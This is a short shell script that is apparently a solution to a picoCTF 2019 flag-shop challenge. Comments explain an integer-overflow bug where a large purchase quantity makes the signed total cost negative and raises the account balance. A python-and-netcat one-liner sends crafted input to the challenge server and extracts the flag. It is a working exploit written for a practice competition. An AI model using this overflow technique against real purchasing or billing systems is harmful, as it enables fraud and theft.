#!/bin/sh

# The bug in this program lies in this lines of code:
#
# total_cost = 900*number_flags;
# printf("\nThe final cost is: %d\n", total_cost);
# if(total_cost <= account_balance){
#     account_balance = account_balance - total_cost;
#     printf("\nYour current balance after transaction: %d\n\n", account_balance);
# }

# total_cost is a signed integer, which means it can have negative values, we just need a number that
# multiplied by 900 overflows the maximum positive number and turns into a negative number.

# this number needs to be positive to pass the check if (number_flags > 0)

# after we supply a valid number, then the operation account_balance = account_balance - total_cost; will
# add the total cost to our account balance since we are subtracting a negative number.

# with the right amount we will be able to buy the flag

python -c 'import sys; sys.stdout.write("2\n1\n2387092\n2\n2\n1\n3\n"); sys.stdout.flush()' | nc 2019shell1.picoctf.com 3967 | grep -oE 'picoCTF\{.*\}'
